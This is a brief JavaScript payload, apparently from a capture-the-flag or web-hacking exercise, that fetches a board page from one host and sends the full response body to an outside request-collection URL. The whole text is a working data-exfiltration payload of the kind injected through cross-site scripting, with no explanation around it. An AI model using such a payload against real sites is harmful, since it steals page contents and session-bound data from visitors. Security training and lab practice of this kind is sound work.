fetch("http://edu.arang.kr:9103/board/0")
  .then(r => r.text())
  .then(body => {
    fetch(
      "https://tools.dreamhack.games/requestbin/kufgixl?x=" +
      encodeURIComponent(body)
    );
  });
